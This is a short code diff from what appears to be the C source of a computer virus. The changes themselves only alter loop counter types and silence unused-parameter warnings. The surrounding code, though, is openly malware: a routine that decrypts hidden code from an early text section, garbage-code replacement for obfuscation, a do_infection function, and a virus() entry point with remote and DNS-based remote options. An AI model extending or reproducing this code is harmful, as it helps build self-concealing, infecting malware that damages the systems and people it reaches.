@@ -40,7 +40,7 @@ int _replace_jmp_gb(Garbage g){
 
 void change_garbage_code(){
 	//print("now: ");printnbln(garbage_table_len);
-	for (int i = 0 ; i < garbage_table_len; i++){
+	for (size_t i = 0 ; i < garbage_table_len; i++){
 		_replace_jmp_gb(garbage_table[i]);
 	}
 }
@@ -61,10 +61,10 @@ int __attribute__((section (".textearly"))) decryptHiddenCode(){
 	//decrypt(&test_area,15,(uint32_t*)key);
 	// -> error, decrypt dont work
 	//check test area
-	for (int i = 0; i < 15; i += 8)
+	for (uint64_t i = 0; i < 15; i += 8)
 		if (i + 8 < 15)
 			decrypt_block((uint32_t*)(char*)&test_area + i, (uint32_t*)key);
-	for (int i = 0; i < 15; i++)
+	for (uint64_t i = 0; i < 15; i++)
 		if ((&test_area)[i] != 'A')
 			return FALSE;
 	return TRUE;
@@ -83,6 +83,8 @@ void do_infection(){
 }
 
 int virus(int ac, char **av){
+	(void)ac;
+	(void)av;
 	if (opt.do_remote) remote();
 	if (opt.do_dns_remote)
 		dns_remote();
